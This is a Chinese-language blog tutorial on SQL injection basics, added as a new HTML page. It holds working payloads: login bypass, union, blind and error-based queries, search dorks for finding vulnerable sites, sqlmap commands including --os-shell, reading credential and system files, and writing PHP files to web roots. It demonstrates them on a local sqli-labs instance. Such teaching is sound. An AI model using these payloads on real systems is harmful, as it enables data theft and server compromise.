@@ -1,0 +1,1026 @@
+<!DOCTYPE html>
+<html>
+<link rel="stylesheet" href="https://unpkg.com/gitalk@latest/dist/gitalk.css">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>1.sql注入基础 - tea9的博客</title>
+    <meta name="author"  content="tea9">
+    <meta name="description" content="1.sql注入基础">
+    <meta name="keywords"  content="web安全, sql注入">
+    <!-- Open Graph -->
+    <meta property="og:title" content="1.sql注入基础 - tea9的博客">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="http://localhost:4000/sql_inject_basic.html">
+    <meta property="og:description" content="心中有光の孩子">
+    <meta property="og:site_name" content="tea9的博客">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/v2/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/v2/assets/css/prism.css">
+    <link rel="stylesheet" href="/v2/assets/css/share.min.css">
+    <link rel="stylesheet" href="/v2/assets/css/app.min.css">
+    <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+	
+	<!--
+Author: Ray-Eldath
+refer to:
+ - http://docs.mathjax.org/en/latest/options/index.html
+-->
+
+	<script type="text/javascript" async src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+	
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+		jax: ["input/TeX", "output/HTML-CSS"],
+		tex2jax: {
+			inlineMath: [ ["$", "$"] ],
+			displayMath: [ ["$$", "$$"] ],
+			skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+		},
+		"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"] }
+      });
+    </script>
+
+	
+    <!--
+Author: Ray-Eldath
+-->
+<style>
+    .markdown-body .anchor{
+        float: left;
+        margin-top: -8px;
+        margin-left: -20px;
+        padding-right: 4px;
+        line-height: 1;
+        opacity: 0;
+    }
+    
+    .markdown-body .anchor .anchor-icon{
+        font-size: 15px
+    }
+</style>
+<script>
+    $(document).ready(function() {
+        let nodes = document.querySelector(".markdown-body").querySelectorAll("h1,h2,h3")
+        for(let node of nodes) {
+            var anchor = document.createElement("a")
+            var anchorIcon = document.createElement("i")
+            anchorIcon.setAttribute("class", "fa fa-anchor fa-lg anchor-icon")
+            anchorIcon.setAttribute("aria-hidden", true)
+            anchor.setAttribute("class", "anchor")
+            anchor.setAttribute("href", "#" + node.getAttribute("id"))
+            
+            anchor.onmouseover = function() {
+                this.style.opacity = "0.4"
+            }
+            
+            anchor.onmouseout = function() {
+                this.style.opacity = "0"
+            }
+            
+            anchor.appendChild(anchorIcon)
+            node.appendChild(anchor)
+        }
+    })
+</script>
+    <!--百度统计-->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d49f14171852506bc53c0072034d9db9";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    <!-- adsbygoogle -->
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-8424272455317055",
+          enable_page_level_ads: true
+     });
+</script>
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> 
+<script> (adsbygoogle = window.adsbygoogle || []).push({ google_ad_client: "ca-pub-8424272455317055", enable_page_level_ads: true }); 
+</script>
+    <!--首页的背景图颜色-->
+<style type="text/css">
+    html{cursor: url("assets/img/cursor.ico"),auto;}
+    body {
+        background-color: rgb(238,216,227);
+        background-image: url('https://coding.net/u/tea9/p/image/git/raw/master/blog_img/appreciate/sana.png');
+        background-repeat:no-repeat;
+        background-position:right;
+        background-attachment:fixed;
+        /*background-size:100% 100%;*/
+        background-size: cover !important;
+        color: #fff:
+    }
+    /*手机适配背景图不显示*/
+    @media screen and (max-width: 480px) {
+        body {
+            background-color: rgb(238,216,227);
+            background-image: url('');
+            background-repeat:no-repeat;
+            background-position:right;
+            background-attachment:fixed;
+            /*background-size:100% 100%;*/
+            background-size: cover !important;
+        }
+
+    }
+    .markdown-body{
+        color: #565656;
+    }
+    .markdown-body code, .markdown-body kbd, .markdown-body pre,.markdown-body table{
+        color: #656565;
+    }
+
+    /*banner字体颜色*/
+    .g-banner,.g-header .g-nav>ul>li {
+        color: #fff;
+    }
+    .post-excerpt,.author-card .author-name,.author-card .bio,.author-card a,.article-list .article-item .post-preview .post-title{
+        color: #4e4e4e;
+    }
+    .article-list .article-item .post-meta .post-date,.g-footer section ,.hitokoto,.g-footer,.g-footer section a,.author-detail,.author-detail a,reward{
+        color: #565656;
+    }
+    .m_post{
+        /*background-color: #F8C3CD;*/
+        /*background:  url('') no-repeat top;*/
+    }
+
+    .m_tag{
+        /*background-color: #F8C3CD;*/
+        background:  url('') no-repeat center;
+    }
+
+    .article-list .article-item{
+        /*background-color: #F8C3CD;*/
+        background:  url('') no-repeat center;
+    }
+    /*.g-banner {
+        background-color: #EED8E2;
+    }*/
+    .banner-theme-default {
+        /*#E1E4E7*/
+        /*background-color: #ffff;*/
+        background:linear-gradient(100deg,#E1E4E7,#E1E4E7);
+        /*background: -o-linear-gradient(0deg,#fff,#fff);*/
+        /*background: -moz-linear-gradient(0deg,#fff,#fff);*/
+    }
+    /*.g-banner{
+        background:  url('https://images.unsplash.com/photo-1520052205864-92d242b3a76b?ixlib=rb-0.3.5&ixid=eyJhcHBfaWQiOjEyMDd9&s=f440be669cb7081adb95b8c0fdff951f&auto=format&fit=crop&w=1650&q=80') no-repeat center
+    }*/
+    .g-banner{
+        background:url('');
+    }
+    .post-content{
+        background-color: rgba(0,0,0,0.01);
+    }
+
+    #hitokoto_title{
+        /*animation-delay: 5s;
+        animation-duration: 100s;
+        animation-iteration-count: infinite;
+        animation-name: shake;
+        animation-timing-function: ease-in-out;*/
+        /*animation-delay: 5s;*/
+        animation-duration: 1s;
+        animation-fill-mode: both;
+        animation-iteration-count: inherit;
+        animation-name: bounce;
+        transform-origin: center bottom;
+        overflow-y: hidden;
+    }
+    @media #hitokoto_title{
+        
+    }
+
+    /*弹跳动画*/
+    @keyframes bounce {
+          0%, 15%, 47%, 73%,89%,100% {
+            animation-timing-function: ease-out;
+            transform: translate3d(0,0,0);
+          }
+
+          30%, 32% {
+            animation-timing-function: ease-in;
+            transform: translate3d(0, -42px, 0);
+          }
+
+          60% {
+            animation-timing-function: ease-in;
+            transform: translate3d(0, -24px, 0);
+          }
+
+          82% {
+            animation-timing-function: ease-in;
+            transform: translate3d(0, -12px, 0);
+          }
+
+          94% {
+            animation-timing-function: ease-in;
+            transform: translate3d(0,-3px,0);
+          }
+        }
+</style>
+</head>
+
+<body>
+  <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+<input id="nm-switch" type="hidden" value="false"> <header class="g-header">
+    <div class="g-logo">
+      <a href="/"></a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/v2">home</a></li>
+            
+            <li><a href="/v2/categories.html">categories</a></li>
+            
+            <li><a href="/v2/links/">links</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern- bgcolor-pink post-no-cover" data-theme="pink">
+    <div class="post-wrapper">
+      <div class="post-tags">
+        
+          
+            <a href="http://localhost:4000/tags#web%E5%AE%89%E5%85%A8" class="post-tag">web安全</a>
+          
+            <a href="http://localhost:4000/tags#sql%E6%B3%A8%E5%85%A5" class="post-tag">sql注入</a>
+          
+        
+      </div>
+      <h1>1.sql注入基础</h1>
+      <div class="post-meta">
+        <span class="post-meta-item"><i class="iconfont icon-author"></i><a href="http://localhost:4000" target="_blank" rel="author">tea9</a></></span>
+        <!-- <span class="post-meta-item"><i class="iconfont icon-author"></i>tea9</span> -->
+        <time class="post-meta-item" datetime="18-10-11"><i class="iconfont icon-date"></i>11 Oct 2018</time>
+      </div>
+    </div>
+    
+  </header>
+  <div class="post-content visible">
+    
+
+    <article class="markdown-body">
+      <h2 id="目录">目录</h2>
+<!-- MarkdownTOC -->
+
+<ul>
+  <li>SQL注入原理
+    <ul>
+      <li>SQL注入原理-SQL注入产生原因</li>
+      <li>SQL注入原理-SQL注入核心原理</li>
+    </ul>
+  </li>
+  <li>SQL注入的危害</li>
+  <li>mysql注入语句
+    <ul>
+      <li>mysql注入语句-mysql介绍</li>
+      <li>mysql注入语句-万能密码</li>
+      <li>mysql注入语句-注入语句例子</li>
+    </ul>
+  </li>
+  <li>sql注入流程</li>
+  <li>MySQL手工注入方法</li>
+  <li>TIPS</li>
+  <li>实例</li>
+  <li>相关链接</li>
+</ul>
+
+<!-- /MarkdownTOC -->
+
+<h2 id="sql注入原理">SQL注入原理</h2>
+
+<h3 id="sql注入原理-sql注入产生原因">SQL注入原理-SQL注入产生原因</h3>
+
+<blockquote>
+  <p>基于B/S架构的网络上，对安全控制能力较弱，然后开发人员水平和经验参差不齐，没有对用户输入数据，或者对页面中携带的信息进行必要的判断。攻击者利用这个机会提交一段数据库查询代码，可以获得一些数据库信息。</p>
+</blockquote>
+
+<h3 id="sql注入原理-sql注入核心原理">SQL注入原理-SQL注入核心原理</h3>
+
+<blockquote>
+  <p>SQL注入是一种将恶意的SQL代码插入到用户的输入参数中的攻击，攻击者探测出开发者编程过程中的漏洞，利用漏洞，巧妙的构造SQL语句，对数据库的内容进行检索或修改。</p>
+</blockquote>
+
+<blockquote>
+  <p>简单概括：利用现有应用程序，将精心构造的SQL语句“注入”到后台数据库所执行的恶意操作</p>
+</blockquote>
+
+<hr />
+
+<blockquote>
+  <p>灵活的SQL查询语句+用户输入的数据带入可执行SQL语句=用户直接操作数据库-&gt;SQL注入漏洞</p>
+</blockquote>
+
+<h2 id="sql注入的危害">SQL注入的危害</h2>
+
+<ul>
+  <li>数据库信息泄露：数据库中存放的用户的隐私信息的泄漏。</li>
+  <li>网页篡改：通过操作数据库对特定网页进行篡改。</li>
+  <li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li>
+  <li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改。</li>
+  <li>服务器被远程控制，被安装后门。经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li>
+  <li>破坏硬盘数据，瘫痪全系统</li>
+</ul>
+
+<h2 id="mysql注入语句">mysql注入语句</h2>
+<h3 id="mysql注入语句-mysql介绍">mysql注入语句-mysql介绍</h3>
+
+<blockquote>
+  <p>MySQL是一个关系型数据库管理系统，由瑞典MySQL AB 公司开发，目前属于 Oracle 旗下产品。MySQL 是最流行的关系型数据库管理系统之一，在 WEB 应用方面，MySQL是最好的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件。
+MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。
+MySQL所使用的 SQL 语言是用于访问数据库的最常用标准化语言。MySQL 软件采用了双授权政策，分为社区版和商业版，由于其体积小、速度快、总体拥有成本低，尤其是开放源码这一特点，一般中小型网站的开发都选择 MySQL 作为网站数据库。</p>
+</blockquote>
+
+<p>– 摘自百度百科</p>
+
+<h3 id="mysql注入语句-万能密码">mysql注入语句-万能密码</h3>
+
+<pre><code># 登录处正常的SQL语句：
+select * from users where username= 'admin' and pwd = 'pass';
+
+# 万能密码：
+'or '1' = '1 
+
+# 带入用户输入参数
+select * from users where username= ''or '1' = '1' and pwd = ''or '1' = '1';
+
+第一个 or 前面为 false 后面为 true -&gt; true
+and 前面为 true 后面为 false -&gt; false
+第二个 or 前面为 false 后面为 true -&gt; true
+</code></pre>
+
+<h3 id="mysql注入语句-注入语句例子">mysql注入语句-注入语句例子</h3>
+
+<pre><code># 利用构造1=2错误执行union后面的语句
+and 1=2 union select 1,2,3--
+
+# 利用mysql正则表达式为匹配当前用户是否为ro开头
+select user() regexp '^ro'
+
+# 查询当前用户的ascii码是否为114（r）
+ascii(substr(substr(select user()),1,1))=114
+
+# 如果当前用户的ascii码为114（r） 就返回0 否则就睡5秒
+if(ascii(substr((select user()),1,1))=114,0,sleep(5))
+
+# 查询第一个表名的ascii码是否为99（c） 是返回1 否返回0
+(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=99)
+
+# 利用updatexml报错，返回版本信息
+updatexml(1,concat(0x7e,(select @@version),0x7e),1)
+</code></pre>
+
+<h2 id="sql注入流程">sql注入流程</h2>
+
+<ol>
+  <li>
+    <p><strong>目标搜集：</strong><br />
+ 无特定目标：</p>
+
+    <pre><code> inurl:php?id=
+</code></pre>
+
+    <p>有特定目标：</p>
+
+    <pre><code> inurl:php?id= site:target.com
+</code></pre>
+
+    <p>工具爬取：</p>
+
+    <pre><code> spider，对搜索引擎和目标网站的链接进行爬取
+</code></pre>
+  </li>
+  <li>
+    <p><strong>注入识别：</strong><br />
+ 手工简单识别：</p>
+
+    <pre><code> '
+ and 1=1 / and 1=2
+ and '1' ='1 / and '1'='2
+ and 1 like 1 / and 1 like 2
+</code></pre>
+
+    <p>工具识别：</p>
+
+    <pre><code> sqlmap -m filename (filename中保存检测目标)
+ sqlmap --crawl (sqlmap对网站进行爬取，然后依次进行测试)
+</code></pre>
+  </li>
+  <li>
+    <p><strong>高级识别：</strong></p>
+
+    <p>扩展识别广度和深度：</p>
+
+    <pre><code> sqlmap --level 增加测试级别，对header中相关参数也进行测试
+ sqlmap -r filename(filename中为网站请求数据)
+</code></pre>
+
+    <p>利用工具提高识别效率：</p>
+
+    <pre><code> BurpSuite + SqlMap
+</code></pre>
+
+    <p>Tips:</p>
+
+    <pre><code> 可以在参数后键入 “*” 来确定想要测试的参数  
+ 可能出现注入的点：新闻、登录、搜索、留言......  
+ 站在开发的角度去寻找  
+</code></pre>
+  </li>
+  <li>
+    <p><strong>代码审计：</strong></p>
+
+    <p>搜索关键代码和函数</p>
+
+    <pre><code> 关键代码包括 $_GET/$_POST/$id/select/SELECT
+</code></pre>
+
+    <p>梳理业务流程</p>
+  </li>
+</ol>
+
+<h2 id="mysql手工注入方法">MySQL手工注入方法</h2>
+
+<p><strong>MySQL数据库结构</strong></p>
+
+<ul>
+  <li>Mysql
+    <ul>
+      <li>连接层
+        <ul>
+          <li>通信协议</li>
+          <li>线程</li>
+          <li>验证</li>
+        </ul>
+      </li>
+      <li>SQL层
+        <ul>
+          <li>解析器</li>
+          <li>授权</li>
+          <li>优化器</li>
+          <li>查询执行</li>
+          <li>查询高速缓存</li>
+          <li>查询日志记录</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p><strong>SQL层的功能</strong></p>
+
+<ol>
+  <li>判断语法、语句、语义</li>
+  <li>数据库对象授权情况判断，授权失败不继续</li>
+  <li>解析（解析器）：将sql语句解析成执行计划，运行执行计划，生成找数据的方式</li>
+  <li>优化（优化器）：运行执行计划，基于算法，从执行计划中选择代价最小的交给“执行器”</li>
+  <li>执行（执行器）：运行执行计划，最终生产如何去磁盘找数据方式</li>
+  <li>将取数据的方式，交由下层（存储引擎层）进行处理</li>
+  <li>最终将取出的数据抽象成管理员或用户能看懂的方式（表），展现在用户面前</li>
+  <li>查询缓存：缓存之前查询的数据</li>
+</ol>
+
+<p><strong>MySQL内置库（&gt;=5.7）</strong></p>
+
+<p>mysql: 账户信息、权限信息、存储过程、event、时区等信息。</p>
+
+<p>sys: 存储过程、自定义函数、视图帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</p>
+
+<p>performance_schema: 用于收集数据库服务器性能参数</p>
+
+<p>information_schema: 访问数据库元数据的方式，保存关于MySQL服务器所维护的所有其他数据库信息，如数据库名，数据库表，表的数据类型与访问权限等。</p>
+
+<p><strong>查询数据核心语法</strong></p>
+
+<pre><code># 查库
+select schema_name from information_schema.schemata;
+
+#查表
+select table_name from information_schema.tables where table_schema=库名;
+
+#查列
+select column_name from information_schema.columns where table_name=表名;
+
+#查数据
+select 列名 from 库名.表名;
+</code></pre>
+
+<p><strong>Tips</strong></p>
+
+<p>提示1: 所有类型的sql注入，都是基于查库、表、列语句<br />
+提示2: 如果数据太多，导致无法返回查询结果：<br />
+	查询的场景：可利用limit限定返回数量及为止，依次查询<br />
+	<code>select username,password from security.users limit 0,1;</code><br />
+	回显数据的场景：* concat * 链接多个数据成为一条返回结果<br />
+	<code>select group_concat(schema_name) from infromation_schema.schemata;</code><br />
+提示3: 在一些场景，想要快速获取数据，需要借助工具，如：BurpSuite</p>
+
+<p><strong>sql注入流程</strong></p>
+
+<p><a href="http://naotu.baidu.com/file/18232e9bd73bf191df5d048930c001bf?token=86fd9c0a184789f3">思维导图</a></p>
+
+<ul>
+  <li>SQL注入
+    <ul>
+      <li>信息搜集
+        <ul>
+          <li>数据库类型
+            <ul>
+              <li>报错信息</li>
+              <li>特有语句（不同数据库版本）</li>
+            </ul>
+          </li>
+          <li>数据库版本</li>
+          <li>数据库用户</li>
+          <li>判断数据库权限</li>
+        </ul>
+      </li>
+      <li>数据获取
+        <ul>
+          <li>获取库信息
+            <ul>
+              <li>获取当前库</li>
+              <li>获取所有库</li>
+            </ul>
+          </li>
+          <li>获取表信息</li>
+          <li>获取列信息</li>
+          <li>获取数据</li>
+        </ul>
+      </li>
+      <li>提权
+        <ul>
+          <li>根据数据库权限
+            <ul>
+              <li>执行系统命令
+                <ul>
+                  <li>直接提权（
+                    <ul>
+                      <li>mssql：调用xp.cmdshell执行系统命令、</li>
+                      <li>mysql：写木马到网站目录、</li>
+                      <li>sqlmap  <code>--os-shell（os shell会上传两个文件一个木马  一个是创建文件 富于这个文件775的权限控制权限））</code></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li>读文件
+                <ul>
+                  <li>读数据库配置文件,尝试远程连接</li>
+                  <li>读系统配置文件，搜集信息
+                    <ul>
+                      <li><code>select load_file('/etc/password')</code></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li>写文件
+                <ul>
+                  <li>写webshell到网站目录
+                    <ul>
+                      <li>outfile (需要绝对路径) <code>（格式： select * into outfile "文件地址" 示例：select * info outfile 'f:/mysql/test/one' form teacher_class; ）</code></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="tips">TIPS</h2>
+
+<p>mysql写shell</p>
+<blockquote>
+  <p>1.需要知道绝对路径(web下层目录)
+2.用户需要file权限(root可写)，一般用户不会有file权限
+3.文件大小小于max_allow_upload
+4.secure_file_priv 指定可写目录</p>
+</blockquote>
+
+<p>写</p>
+
+<pre><code>select '&lt;?php phpinfo();?&gt;' into outfile 'c://php//www//kkk.php';
+select '&lt;?php phpinfo();?&gt;' into dumpfile 'c://php//www//kkk2.php';
+select * from user into outfile 'c://php//www/kkk4.php' fields terminated by '&lt;?php phpinfo();?&gt;'
+</code></pre>
+
+<hr />
+
+<h2 id="实例">实例</h2>
+
+<p>tips:</p>
+<blockquote>
+  <p>查询数据的时候把信息记录到txt上</p>
+</blockquote>
+
+<pre><code># 判断是否存在sql注入 
+http://127.0.0.1/Less-1/?id=2' 
+http://127.0.0.1/Less-1/?id=2' and '1'=2
+
+# 判断列数
+http://127.0.0.1/Less-1/?id=2' order by 3--+
+
+# 判断输出信息位置 (union之前要报错才会查询union后面的)
+http://127.0.0.1/Less-1/?id=99999' union select 1,2,3--+
+
+# 查库名
+http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(schema_name) from information_schema.schemata--+
+
+# 查表名 'security'/十六进制0x/database()
+http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(table_name) from information_schema.tables where table_schema='security'--+
+
+# 查数据 group_concat/concat_ws
+http://127.0.0.1/Less-1/?id=' union select 1,2,（select group_concat(username,0x7e,password) from security.users)--+
+
+# 查权限
+http://127.0.0.1/Less-1/?id=' union select 1,2,(select user())--+ 
+
+&gt; root@localhost 
+
+#  读文件 db-creds.inc 数据库配置文件
+http://127.0.0.1/Less-1/?id=' union select 1,2,(select load_file('/var/www/html/sql-connections/db-creds.inc'))--+ 
+</code></pre>
+
+<h2 id="相关链接">相关链接</h2>
+
+<p><a href="https://www.mysql.com/">mysql官网</a><br />
+<a href="https://dev.mysql.com/doc/refman/5.7/en/dynindex-function.html">mysql内置函数</a>  <br />
+<a href="http://ascii.911cha.com/">ascii对照表</a><br />
+<a href="http://www.runoob.com/mysql/mysql-regexp.html">mysql正则</a><br />
+<a href="https://blog.csdn.net/vspiders/article/details/77430024">MYSQL updatexml报错注入</a><br />
+<a href="https://blog.csdn.net/i_peter/article/details/53380334">Python Spider 的总结</a><br />
+<a href="https://blog.csdn.net/hxsstar/article/details/19337461">MySQL手工注入步骤+直接写入一句话</a><br />
+<a href="https://blog.csdn.net/m2417599488/article/details/72236666">Mysql通过命令授于用户数据库操作权限</a><br />
+<a href="https://blog.csdn.net/zhaoyangjian724/article/details/52121193">mysql 函数执行权限</a></p>
+
+
+    </article>
+
+    
+      <!--
+Author: Ray-Eldath
+refer to:
+ - https://github.com/theme-next/hexo-theme-next/blob/4bfbd67b3edc6f11b00357da6e509e5281a896f1/layout/_macro/reward.swig and
+ - https://github.com/theme-next/hexo-theme-next/blob/e12bb0b27e16072eb82baa4c7dda1c41c8de7264/source/css/_common/components/post/post-reward.styl
+ 赞赏
+-->
+<style media="screen">
+  .reward {
+    padding: 5px 0;
+    margin: 20px auto;
+    width: 90%;
+    text-align: center;
+  }
+  .rewardButton {
+    background-color: #f44236;
+    -moz-border-radius: 8px;
+    -webkit-border-radius: 8px;
+    border-radius: 8px;
+    display: inline-block;
+    cursor: pointer;
+    color: #ffffff;
+    font-family: '微软雅黑';
+    font-size: 18px;
+    padding: 5px 25px;
+    text-decoration: none;
+  }
+  .rewardButton:hover {
+    background-color: #F7877F;
+  }
+  .wechat:hover p {
+    animation: roll 0.1s infinite linear;
+    -webkit-animation: roll 0.1s infinite linear;
+    -moz-animation: roll 0.1s infinite linear;
+  }
+  .alipay:hover p {
+    animation: roll 0.1s infinite linear;
+    -webkit-animation: roll 0.1s infinite linear;
+    -moz-animation: roll 0.1s infinite linear;
+  }
+  .QR {
+    padding-top: 20px;
+  }
+  .QR a {
+    border: 0;
+  }
+  .QR img {
+    width: 180px;
+    max-width: 100%;
+    display: inline-block;
+    margin: 0.8em 2em 0 2em;
+  }
+</style>
+
+<div class="reward">
+  <a class="rewardButton" title="请tea9喝杯咖啡？">赞 赏</a>
+
+  <div class="QR" style="display: none;">
+    
+    <div>
+      <span style="font-family: '微软雅黑'; font-size: 18px; ">多谢了你的赞赏！</span>
+    </div>
+    
+
+    
+    <div class="wechat" style="display: inline-block">
+      <img class="wechat_qr" src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/appreciate/wechatpay.png" title="用微信请tea9喝杯咖啡？" alt="用微信请tea9喝杯咖啡？" />
+      <p>微信支付</p>
+    </div>
+    
+
+    
+    <div class="alipay" style="display: inline-block">
+      <img class="alipay_qr" src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/appreciate/alipay.png" title="用支付宝请tea9喝杯咖啡？" alt="用支付宝请tea9喝杯咖啡？" />
+      <p>支付宝</p>
+    </div>
+    
+  </div>
+</div>
+
+<script type="text/javascript">
+  $(document).ready(function() {
+    $("a.rewardButton").click(function() {
+      $("div.QR").slideToggle()
+    });
+  });
+</script>
+    
+
+    
+
+
+    
+    <div class="social-share-wrapper">
+      <div class="social-share"></div>
+    </div>
+    
+  </div>
+
+  <section class="author-detail" style="top: -285'px;">
+    <section class="post-footer-item author-card">
+      <div class="avatar">
+        <img src="http://localhost:4000/v2/assets/img/profile.png" alt="">
+      </div>
+      <div class="author-name" rel="author">tea9</div>
+      <div class="bio">
+        <p>心中有光の孩子</p>
+      </div>
+      
+      <ul class="sns-links">
+        
+        <li>
+          <a href="//github.com/tea9" target="_blank">
+                    <i class="iconfont icon-github"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//mobile.twitter.com/shaomiaosun" target="_blank">
+                    <i class="iconfont icon-twitter"></i>
+                </a>
+        </li>
+        
+        <li>
+          <a href="//www.jianshu.com/u/b558f389d0ec" target="_blank">
+                    <i class="iconfont icon-jianshu"></i>
+                </a>
+        </li>
+        
+      </ul>
+      
+    </section>
+    <section class="post-footer-item read-next">
+      
+      <div class="read-next-item">
+        <a href="/v2/termux_course.html" class="read-next-link"></a>
+        <section>
+          <span>termux相关</span>
+          <p>前言：</p>
+        </section>
+        
+     </div>
+      
+
+      
+      <div class="read-next-item">
+        <a href="/v2/xss_note.html" class="read-next-link"></a>
+          <section>
+            <span>xss的语句</span>
+            <p>这是一个xss的闯关游戏</p>
+          </section>
+          
+      </div>
+      
+    </section>
+    <section class="post-footer-item comment">
+      <div id="disqus_thread"></div>
+      <div id="gitalk_container"></div>
+      <div class="valine_comment"></div>
+    </section>
+    <section class="post-footer-item comment">
+      <br/><br/><br/><br/>
+      <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议</a>进行许可。
+    </section> 
+  </section>
+
+  <!--点击统计-->
+
+	<!--
+Author: Ray-Eldath
+refer to:
+ - https://github.com/theme-next/hexo-theme-next/blob/master/source/js/src/utils.js
+ - https://jingyan.baidu.com/article/b2c186c83ec846c46ef6ff80.html
+ - http://www.bkjia.com/jQuery/449205.html
+ 这个是返回顶部的
+-->
+<style media="screen">
+  .scroll {
+    z-index: 10000;
+    display: none;
+    width: 70px;
+    height: 24px;
+    /*background: #FC6794;*/
+    background: rgb(195,190,190);
+    color: #fff;
+    line-height: 24px;
+    text-align: center;
+    position: fixed;
+    right: 30px;
+    bottom: 30px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+</style>
+<div class="scroll">
+  <i class="fa fa-arrow-up"></i>
+  <span class="scrollpercent"></span><span> %</span>
+</div>
+
+<script src="/assets/js/util.js"></script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    if (utils.isMobile()) {
+      $('.scroll').hide();
+      return;
+    }
+    $(window).scroll(function() {
+      let scrollValue = $(window).scrollTop();
+      var scrollPercentRounded = Math.round((scrollValue / utils.getContentVisibilityHeight()) * 100);
+      var scrollPercentMaxed = (scrollPercentRounded > 100) ? 100 : scrollPercentRounded;
+      $('.scrollpercent').html(scrollPercentMaxed);
+      scrollValue > 100 ? $('.scroll').fadeIn() : $('.scroll').fadeOut();
+    });
+    $('.scroll').click(function() {
+      $('html, body').animate({
+        scrollTop: 0
+      }, 300);
+    })
+  })
+</script>
+
+
+<footer class="g-footer">
+  <section>tea9的博客 ©
+  
+  
+    2018
+    -
+  
+  2019
+  </section>
+  <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+
+ <!--  <p>
+    <div class="busuanzi-count">
+      <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+      <span class="site-uv" title="总点击人数">
+          <img src="/assets/icons/person.svg" width="10" height="16">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+      &nbsp;&nbsp;|&nbsp;&nbsp;
+      <span class="site-pv" title="总点击量">
+          <img src="/assets/icons/eye.svg" width="16" height="16">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span>
+      &nbsp;&nbsp;|&nbsp;&nbsp;
+      <span class="page-pv"title="本页面点击人数">
+          <img src="/assets/icons/file-text.svg" width="12" height="16">
+      <span class="busuanzi-value" id="busuanzi_value_page_pv"></span></span>
+    </div>
+    </p> -->
+        
+      <p id="hitokoto" class="hitokoto">:D 获取中...</p>
+    
+    <section class="hitokoto"><a href="https://tea9.coding.me/">coding源</a></section>
+    <section class="hitokoto"> <SPAN id="span_dt_dt"></SPAN>
+    <SCRIPT language=javascript>
+    function show_date_time(){
+    window.setTimeout("show_date_time()", 1000);
+    BirthDay=new Date("5/9/2018 00:00:00"); //注释:月-日-年  时-分-秒
+    today=new Date();
+    timeold=(today.getTime()-BirthDay.getTime());
+    sectimeold=timeold/1000
+    secondsold=Math.floor(sectimeold);
+    msPerDay=24*60*60*1000
+    e_daysold=timeold/msPerDay
+    daysold=Math.floor(e_daysold);
+    e_hrsold=(e_daysold-daysold)*24;
+    hrsold=setzero(Math.floor(e_hrsold));
+    e_minsold=(e_hrsold-hrsold)*60;
+    minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+    seconds=setzero(Math.floor((e_minsold-minsold)*60));
+    span_dt_dt.innerHTML="我已活着"+daysold+"天"+hrsold+"时"+minsold+"分"+seconds+"秒";
+    }
+    function setzero(i){
+    if (i<10)
+    {i="0" + i};
+    return i;
+    }
+    show_date_time();
+    </SCRIPT></section>
+    <section class="hitokoto"><a href="/laji">垃圾</a></section>
+</footer>
+
+
+
+
+  <!--评论-->
